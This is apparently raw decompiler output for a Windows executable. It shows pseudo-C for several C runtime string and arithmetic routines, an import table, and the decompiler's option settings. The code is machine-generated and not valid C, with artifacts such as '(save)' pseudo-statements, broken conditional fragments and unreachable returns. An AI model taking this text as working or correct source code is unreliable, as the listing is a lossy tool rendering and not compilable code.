/*	Procedure: 0x0040D3D7 - 0x0040D3E4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D3D7()
{



    *(edi + 3) = *(esi + 3);
    eax = *(ebp + 8);
    (restore)esi;
    (restore)edi;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040D3E5 - 0x0040D3FA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D3E5()
{



    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    eax = *(ebp + 8);
    (restore)esi;
    (restore)edi;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040D3FB - 0x0040D414
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D3FB()
{



    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    *(edi + 1) = *(esi + 1);
    eax = *(ebp + 8);
    (restore)esi;
    (restore)edi;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040D415 - 0x0040D638
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D415()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4254024;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 28;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edi = 0;
    if(*L0041AA24 == 0) {
        (save)0;
        (save)0;
        ebx = 1;
        (save)1;
        (save)4253948;
        esi = 256;
        (save)256;
        (save)0;
        if(*__imp__LCMapStringW() != 0) {
            *L0041AA24 = ebx;
        } else {
            (save)edi;
            (save)edi;
            (save)ebx;
            (save)4253944;
            (save)esi;
            (save)edi;
            if(*__imp__LCMapStringA() == 0) {
                goto L0040d5a3;
            }
            *L0041AA24 = 2;
        }
    }
    if(*(ebp + 20) > edi) {
        *(ebp + 20) = L0040D639( *(ebp + 16), *(ebp + 20));
    }
    eax = *L0041AA24;
    if(eax == 2) {
        (save) *(ebp + 28);
        (save) *(ebp + 24);
        (save) *(ebp + 20);
        (save) *(ebp + 16);
        (save) *(ebp + 12);
        (save) *(ebp + 8);
        eax = *__imp__LCMapStringA();
    } else {
        if(eax == 1) {
            if(*(ebp + 32) == edi) {
                *(ebp + 32) = *L0041AA1C;
            }
            (save)edi;
            (save)edi;
            (save) *(ebp + 20);
            (save) *(ebp + 16);
            eax = ~( *(ebp + 36));
            asm("sbb eax,eax");
            (save)(eax & 8) + 1;
            (save) *(ebp + 32);
            ebx = *__imp__MultiByteToWideChar();
            *(ebp - 28) = ebx;
            if(ebx != edi) {
                *(ebp - 4) = edi;
                al = ebx + ebx + 3 & 252;
                L0040A560();
                *(ebp - 24) = esp;
                *(ebp - 36) = esp;
                *(ebp - 4) = *(ebp - 4) | -1;
                goto L0040d538;
                return(1);
                esp = *(ebp - 24);
                edi = 0;
                *(ebp - 36) = 0;
                *(ebp - 4) = *(ebp - 4) | -1;
                ebx = *(ebp - 28);
L0040d538:
                if(*(ebp - 36) != edi) {
                    (save)ebx;
                    (save) *(ebp - 36);
                    (save) *(ebp + 20);
                    (save) *(ebp + 16);
                    (save)1;
                    (save) *(ebp + 32);
                    if(*__imp__MultiByteToWideChar() != 0) {
                        (save)edi;
                        (save)edi;
                        (save)ebx;
                        (save) *(ebp - 36);
                        (save) *(ebp + 12);
                        (save) *(ebp + 8);
                        esi = *__imp__LCMapStringW();
                        *(ebp - 40) = esi;
                        if(esi != edi) {
                            if(*(ebp + 13) & 4) {
                                goto L0040d5b7;
                            }
                            if(*(ebp + 28) == edi || esi <= *(ebp + 28) && *__imp__LCMapStringW( *(ebp + 8), *(ebp + 12), *(ebp - 36), ebx, *(ebp + 24), *(ebp + 28)) != 0) {
                                goto L0040d632;
                            }
                        }
                    }
                }
            }
        }
L0040d5a3:
        eax = 0;
    }
L0040d5a5:
    esp = ebp - 56;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
    return;
L0040d5b7:
    *(ebp - 4) = 1;
    al = esi + esi + 3 & 252;
    L0040A560();
    *(ebp - 24) = esp;
    ebx = esp;
    *(ebp - 32) = ebx;
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L0040d5eb;
    return(1);
    esp = *(ebp - 24);
    edi = 0;
    ebx = 0;
    *(ebp - 4) = *(ebp - 4) | -1;
    esi = *(ebp - 40);
L0040d5eb:
    if(ebx == edi) {
        goto L0040d5a3;
    }
    (save)esi;
    (save)ebx;
    (save) *(ebp - 28);
    (save) *(ebp - 36);
    (save) *(ebp + 12);
    (save) *(ebp + 8);
    if(*__imp__LCMapStringW() == 0) {
        goto L0040d5a3;
    }
    (save)edi;
    (save)edi;
    if(*(ebp + 28) == edi) {
        (save)edi;
        (save)edi;
    } else {
        (save) *(ebp + 28);
        (save) *(ebp + 24);
    }
    (save)esi;
    (save)ebx;
    (save)544;
    (save) *(ebp + 32);
    esi = *__imp__WideCharToMultiByte();
    if(esi == edi) {
        goto L0040d5a3;
    }
L0040d632:
    eax = esi;
    goto L0040d5a5;
}

/*	Procedure: 0x0040D639 - 0x0040D66F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D639(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    eax = A4;
    A8 :: 0;
    (save)esi;
    if(!(ecx = A8 - 1)) {
        do {
            if(*eax == 0) {
                break;
            }
            eax = eax + 1;
            esi = ecx;
            ecx = ecx - 1;
        } while(esi != 0);
    }
    (restore)esi;
    if(*eax == 0) {
        return(eax - A4);
    }
    return(A8);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 0040d670 -> 0040d661 */
/*	Procedure: 0x0040D670 - 0x0040D67F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

RtlUnwind()
{



    goto ( *__imp__RtlUnwind);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040D680 - 0x0040D74F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 12
 */

L0040D680(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = Ac;
    edi = A8;
    eax = 4303364;
    if(*L0041AA0C == 0) {
        al = 255;
L0040d69c:
        do {
            if(al == 0) {
                goto L0040d6ce;
            }
            al = *esi;
            esi = esi + 1;
            ah = *edi;
            edi = edi + 1;
            if(ah == al) {
                goto L0040d69c;
            }
            al = al - 65;
            al :: 26;
            asm("sbb cl,cl");
            cl = cl & 32;
            al = al + cl + 65;
            asm("xchg ah,al");
            al = al - 65;
            al :: 26;
            asm("sbb cl,cl");
            cl = cl & 32;
        } while(al == al + cl + 65);
        asm("sbb al,al");
        asm("sbb al,0xff");
L0040d6ce:
        eax = al;
    } else {
        asm("lock inc dword [0x41ab74]");
        if(*L0041AB70 <= 0) {
            (save)0;
        } else {
            asm("lock dec dword [0x41ab74]");
            eax = L0040BE8F(19);
            *esp = 1;
        }
        eax = 255;
        ebx = 0;
L0040d704:
        do {
            if(al == 0) {
                goto L0040d72f;
            }
            al = *esi;
            esi = esi + 1;
            bl = *edi;
            edi = edi + 1;
            if(al == bl) {
                goto L0040d704;
            }
            (save)eax;
            ebx = L0040D750(ebx);
            eax = L0040D750();
            esp = esp + 4;
        } while(bl == al);
        asm("sbb eax,eax");
        asm("sbb eax,-0x1");
L0040d72f:
        ebx = eax;
        (restore)eax;
        if(eax == 0) {
            asm("lock dec dword [0x41ab74]");
        } else {
            L0040BEF0(19);
        }
        eax = ebx;
    }
}

/*	Procedure: 0x0040D750 - 0x0040D81A
 *	Argument size: 6
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D750(A8, A9, Aa)
/* unknown */ void  A8;
/* unknown */ void  A9;
/* unknown */ void  Aa;
{



    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    if(*L0041AA0C == 0) {
        eax = A8;
        if(eax >= 65 && eax <= 90) {
            eax = eax + 32;
        }
    } else {
        ebx = A8;
        edi = 256;
        (save)1;
        (restore)esi;
        if(ebx < 256) {
            if(*L004126B4 > esi) {
                eax = L0040B0AA(ebx, esi);
            } else {
                eax = *L004124A8;
                eax = *(eax + ebx * 2) & esi;
            }
            if(eax != 0) {
                goto L0040d7b1;
            }
L0040d7ad:
            eax = ebx;
        } else {
L0040d7b1:
            eax = ebx >> 8;
            if(!( *( *L004124A8 + (al & 255) * 2 + 1) & 128)) {
                Aa = 0;
                (save)2;
                A8 = al;
                A9 = bl;
                (restore)eax;
            } else {
                A9 = 0;
                A8 = bl;
                eax = esi;
            }
            eax = L0040D415( *L0041AA0C, edi, & A8, eax, ebp - 4, 3, 0, esi);
            if(eax == 0) {
                goto L0040d7ad;
            }
            if(eax == esi) {
                eax = *(ebp - 4) & 255;
            } else {
                eax = *(ebp - 3) & 255;
                ecx = *(ebp - 4) & 255;
                eax = eax << 8 | ecx;
            }
        }
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x0040D81B - 0x0040D85D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D81B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)esi;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    for(edx = *(ebp + 12); *edx != 0; asm("bts [esp],eax");) {
        edx = edx + 1;
    }
    esi = *(ebp + 8);
    ecx = ecx | -1;
    do {
        ecx = ecx + 1;
        if(*esi == 0) {
            break;
        }
        asm("bt [esp],eax");
    } while(esi = esi + 1);
    eax = ecx;
    esp = esp + 32;
    (restore)esi;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040D85E - 0x0040D960
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D85E()
{



    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)edi;
    (save)esi;
    (save)ebx;
    ecx = *(ebp + 16);
    if(ecx != 0) {
        esi = *(ebp + 8);
        edi = *(ebp + 12);
        eax = 4303364;
        if(*L0041AA0C != 0) {
            goto L0040d8d1;
        }
        bh = 65;
        bl = 90;
        dh = 32;
        do {
            ah = *esi;
            al = *edi;
            if(ah == 0 || al == 0) {
                break;
            }
            esi = esi + 1;
            edi = edi + 1;
            if(ah >= bh && ah <= bl) {
                ah = ah + dh;
            }
            if(al >= bh && al <= bl) {
                al = al + dh;
            }
            if(ah != al) {
                goto L0040d8bf;
            }
        } while(ecx = ecx - 1);
        ecx = 0;
        if(ah != al) {
L0040d8bf:
            ecx = -1;
            < ? L0040d95a : ;
            ecx = ~LFFFFFFFF;
            goto L0040d95a;
L0040d8d1:
            asm("lock inc dword [0x41ab74]");
            if(*L0041AB70 <= 0) {
                (save)0;
            } else {
                asm("lock dec dword [0x41ab74]");
                ebx = ecx;
                eax = L0040BE8F(19);
                *esp = 1;
                ecx = ebx;
            }
            eax = 0;
            ebx = 0;
            do {
                al = *esi;
                bl = *edi;
                if(eax == 0 || ebx == 0) {
                    break;
                }
                esi = esi + 1;
                edi = edi + 1;
                (save)ecx;
                (save)eax;
                ebx = L0040D750(ebx);
                eax = L0040D750();
                esp = esp + 4;
                (restore)ecx;
                if(eax != ebx) {
                    goto L0040d935;
                }
            } while(ecx = ecx - 1);
            ecx = 0;
            if(eax != ebx) {
L0040d935:
                ecx = -1;
                < ? L0040d93e : ;
                ecx = ~LFFFFFFFF;
            }
            (restore)eax;
            if(eax == 0) {
                asm("lock dec dword [0x41ab74]");
            } else {
                ebx = ecx;
                L0040BEF0(19);
                ecx = ebx;
            }
        }
    }
L0040d95a:
    eax = ecx;
    (restore)ebx;
    (restore)esi;
    (restore)edi;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x0040D961 - 0x0040D96F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D961()
{



}

/*	Procedure: 0x0040D9D8 - 0x0040DA53
 *	Argument size: 4112
 *	Local size: 0
 *	Save regs size: 0
 */

L0040D9D8(A4, A8, Ac, A10)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebx;
    eax = A10;
    if(eax == 0) {
        eax = A8;
        edx = 0;
        ecx = Ac / Ac;
        edx = ecx % ecx;
        eax = A4;
        eax = ecx / ecx % ecx / ecx;
        edx = 0;
    } else {
        ecx = eax;
        ebx = Ac;
        edx = A8;
        eax = A4;
        do {
            ecx = ecx >> 1;
            asm("rcr ebx,1");
            edx = edx >> 1;
            asm("rcr eax,1");
        } while(ecx != 0);
        edx = ebx / ebx % ebx / ebx;
        ecx = eax;
        asm("mul dword [esp+0x14]");
        asm("xchg eax,ecx");
        asm("mul dword [esp+0x10]");
        if(!(edx = edx + ecx) && edx <= A8) {
            < ? L0040da42 : ;
            if(eax <= A4) {
                goto L0040da42;
            }
        }
        eax = eax - Ac;
        asm("sbb edx,[esp+0x14]");
L0040da42:
        eax = eax - A4;
        asm("sbb edx,[esp+0xc]");
        edx = ~edx;
        eax = ~eax;
        asm("sbb edx,+0x0");
    }
    (restore)ebx;
}

/*	Procedure: 0x0040DA55 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040DA55()
{



}

/* address  size  */
/* 0x0040a052       0 */ /* unknown */ void 	VerQueryValueA;
/* 0x0040a058       0 */ /* unknown */ void 	GetFileVersionInfoA;
/* 0x0040a05e       0 */ /* unknown */ void 	LZClose;
/* 0x0040a064       0 */ /* unknown */ void 	LZCopy;
/* 0x0040a06a       0 */ /* unknown */ void 	LZOpenFileA;
/* 0x0040ae85       0 */ /* unknown */ void 	__entry_point__;
/* 0x0040ce23       0 */ /* unknown */ void 	GetOEMCP;
/* 0x0040ce38       0 */ /* unknown */ void 	GetACP;
/* 0x0040d670       0 */ /* unknown */ void 	RtlUnwind;
/* 0x0040e000       0 */ /* unknown */ void 	__imp__RegOpenKeyExA;
/* 0x0040e004       0 */ /* unknown */ void 	__imp__RegDeleteValueA;
/* 0x0040e008       0 */ /* unknown */ void 	__imp__RegDeleteKeyA;
/* 0x0040e00c       0 */ /* unknown */ void 	__imp__RegEnumKeyExA;
/* 0x0040e010       0 */ /* unknown */ void 	__imp__GetUserNameA;
/* 0x0040e014       0 */ /* unknown */ void 	__imp__RegQueryValueExA;
/* 0x0040e018       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x0040e01c       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x0040e020       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x0040e028       0 */ /* unknown */ void 	__imp__GetStockObject;
/* 0x0040e02c       0 */ /* unknown */ void 	__imp__DeleteObject;
/* 0x0040e030       0 */ /* unknown */ void 	__imp__Rectangle;
/* 0x0040e034       0 */ /* unknown */ void 	__imp__SelectObject;
/* 0x0040e038       0 */ /* unknown */ void 	__imp__CreateSolidBrush;
/* 0x0040e040       0 */ /* unknown */ void 	__imp__SetEndOfFile;
/* 0x0040e044       0 */ /* unknown */ void 	__imp__DeleteFileA;
/* 0x0040e048       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x0040e04c       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x0040e050       0 */ /* unknown */ void 	__imp__FreeResource;
/* 0x0040e054       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x0040e058       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x0040e05c       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x0040e060       0 */ /* unknown */ void 	__imp__FindResourceA;
/* 0x0040e064       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x0040e068       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x0040e06c       0 */ /* unknown */ void 	__imp__GetComputerNameA;
/* 0x0040e070       0 */ /* unknown */ void 	__imp__SetErrorMode;
/* 0x0040e074       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x0040e078       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x0040e07c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x0040e080       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x0040e084       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x0040e088       0 */ /* unknown */ void 	__imp__DeleteCriticalSection;
/* 0x0040e08c       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x0040e090       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x0040e094       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x0040e098       0 */ /* unknown */ void 	__imp__GetDriveTypeA;
/* 0x0040e09c       0 */ /* unknown */ void 	__imp__GetLogicalDrives;
/* 0x0040e0a0       0 */ /* unknown */ void 	__imp__FindClose;
/* 0x0040e0a4       0 */ /* unknown */ void 	__imp__FindNextFileA;
/* 0x0040e0a8       0 */ /* unknown */ void 	__imp__FindFirstFileA;
/* 0x0040e0ac       0 */ /* unknown */ void 	__imp__GetFileAttributesA;
/* 0x0040e0b0       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x0040e0b4       0 */ /* unknown */ void 	__imp__MoveFileA;
/* 0x0040e0b8       0 */ /* unknown */ void 	__imp__CreateDirectoryA;
/* 0x0040e0bc       0 */ /* unknown */ void 	__imp__GetTempPathA;
/* 0x0040e0c0       0 */ /* unknown */ void 	__imp__GetShortPathNameA;
/* 0x0040e0c4       0 */ /* unknown */ void 	__imp__ResetEvent;
/* 0x0040e0c8       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x0040e0cc       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x0040e0d0       0 */ /* unknown */ void 	__imp__CreateEventA;
/* 0x0040e0d4       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0040e0d8       0 */ /* unknown */ void 	__imp__LCMapStringW;
/* 0x0040e0dc       0 */ /* unknown */ void 	__imp__GetACP;
/* 0x0040e0e0       0 */ /* unknown */ void 	__imp__GetCPInfo;
/* 0x0040e0e4       0 */ /* unknown */ void 	__imp__GetStringTypeW;
/* 0x0040e0e8       0 */ /* unknown */ void 	__imp__GetStringTypeA;
/* 0x0040e0ec       0 */ /* unknown */ void 	__imp__MultiByteToWideChar;
/* 0x0040e0f0       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040e0f4       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x0040e0f8       0 */ /* unknown */ void 	__imp__HeapCreate;
/* 0x0040e0fc       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x0040e100       0 */ /* unknown */ void 	__imp__GetFileType;
/* 0x0040e104       0 */ /* unknown */ void 	__imp__GetStdHandle;
/* 0x0040e108       0 */ /* unknown */ void 	__imp__SetHandleCount;
/* 0x0040e10c       0 */ /* unknown */ void 	__imp__GetEnvironmentStringsW;
/* 0x0040e110       0 */ /* unknown */ void 	__imp__GetEnvironmentStrings;
/* 0x0040e114       0 */ /* unknown */ void 	__imp__WideCharToMultiByte;
/* 0x0040e118       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsW;
/* 0x0040e11c       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsA;
/* 0x0040e120       0 */ /* unknown */ void 	__imp__UnhandledExceptionFilter;
/* 0x0040e124       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x0040e128       0 */ /* unknown */ void 	__imp__TlsGetValue;
/* 0x0040e12c       0 */ /* unknown */ void 	__imp__SetLastError;
/* 0x0040e130       0 */ /* unknown */ void 	__imp__TlsAlloc;
/* 0x0040e134       0 */ /* unknown */ void 	__imp__TlsSetValue;
/* 0x0040e138       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x0040e13c       0 */ /* unknown */ void 	__imp__HeapSize;
/* 0x0040e140       0 */ /* unknown */ void 	__imp__HeapReAlloc;
/* 0x0040e144       0 */ /* unknown */ void 	__imp__SetEvent;
/* 0x0040e148       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x0040e14c       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x0040e150       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x0040e154       0 */ /* unknown */ void 	__imp__FreeLibrary;
/* 0x0040e158       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x0040e15c       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x0040e160       0 */ /* unknown */ void 	__imp__OpenProcess;
/* 0x0040e164       0 */ /* unknown */ void 	__imp__WaitForSingleObject;
/* 0x0040e168       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x0040e16c       0 */ /* unknown */ void 	__imp__GetCurrentThreadId;
/* 0x0040e170       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x0040e174       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x0040e178       0 */ /* unknown */ void 	__imp__GetVersion;
/* 0x0040e17c       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x0040e180       0 */ /* unknown */ void 	__imp__LCMapStringA;
/* 0x0040e184       0 */ /* unknown */ void 	__imp__GetOEMCP;
/* 0x0040e188       0 */ /* unknown */ void 	__imp__RtlUnwind;
/* 0x0040e18c       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x0040e190       0 */ /* unknown */ void 	__imp__GetStartupInfoA;
/* 0x0040e198       0 */ /* unknown */ void 	__imp__LZCopy;
/* 0x0040e19c       0 */ /* unknown */ void 	__imp__LZClose;
/* 0x0040e1a0       0 */ /* unknown */ void 	__imp__LZOpenFileA;
/* 0x0040e1a8       0 */ /* unknown */ void 	__imp__ShellExecuteA;
/* 0x0040e1b0       0 */ /* unknown */ void 	__imp__CharLowerA;
/* 0x0040e1b4       0 */ /* unknown */ void 	__imp__wsprintfA;
/* 0x0040e1b8       0 */ /* unknown */ void 	__imp__EnumWindows;
/* 0x0040e1bc       0 */ /* unknown */ void 	__imp__PostMessageA;
/* 0x0040e1c0       0 */ /* unknown */ void 	__imp__DispatchMessageA;
/* 0x0040e1c4       0 */ /* unknown */ void 	__imp__GetWindowThreadProcessId;
/* 0x0040e1c8       0 */ /* unknown */ void 	__imp__GetParent;
/* 0x0040e1cc       0 */ /* unknown */ void 	__imp__ExitWindowsEx;
/* 0x0040e1d0       0 */ /* unknown */ void 	__imp__CreateDialogParamA;
/* 0x0040e1d4       0 */ /* unknown */ void 	__imp__PeekMessageA;
/* 0x0040e1d8       0 */ /* unknown */ void 	__imp__IsDialogMessageA;
/* 0x0040e1dc       0 */ /* unknown */ void 	__imp__UpdateWindow;
/* 0x0040e1e0       0 */ /* unknown */ void 	__imp__GetDC;
/* 0x0040e1e4       0 */ /* unknown */ void 	__imp__GetClientRect;
/* 0x0040e1e8       0 */ /* unknown */ void 	__imp__SetWindowTextA;
/* 0x0040e1ec       0 */ /* unknown */ void 	__imp__ReleaseDC;
/* 0x0040e1f0       0 */ /* unknown */ void 	__imp__SetFocus;
/* 0x0040e1f4       0 */ /* unknown */ void 	__imp__DefWindowProcA;
/* 0x0040e1f8       0 */ /* unknown */ void 	__imp__PostQuitMessage;
/* 0x0040e1fc       0 */ /* unknown */ void 	__imp__EndDialog;
/* 0x0040e200       0 */ /* unknown */ void 	__imp__GetDlgItemTextA;
/* 0x0040e204       0 */ /* unknown */ void 	__imp__GetDlgItem;
/* 0x0040e208       0 */ /* unknown */ void 	__imp__EnableWindow;
/* 0x0040e20c       0 */ /* unknown */ void 	__imp__ShowWindow;
/* 0x0040e210       0 */ /* unknown */ void 	__imp__DialogBoxParamA;
/* 0x0040e214       0 */ /* unknown */ void 	__imp__FindWindowA;
/* 0x0040e218       0 */ /* unknown */ void 	__imp__RegisterClassExA;
/* 0x0040e21c       0 */ /* unknown */ void 	__imp__CreateWindowExA;
/* 0x0040e220       0 */ /* unknown */ void 	__imp__SetTimer;
/* 0x0040e224       0 */ /* unknown */ void 	__imp__GetMessageA;
/* 0x0040e228       0 */ /* unknown */ void 	__imp__MessageBoxA;
/* 0x0040e22c       0 */ /* unknown */ void 	__imp__CharUpperA;
/* 0x0040e234       0 */ /* unknown */ void 	__imp__GetFileVersionInfoA;
/* 0x0040e238       0 */ /* unknown */ void 	__imp__VerQueryValueA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
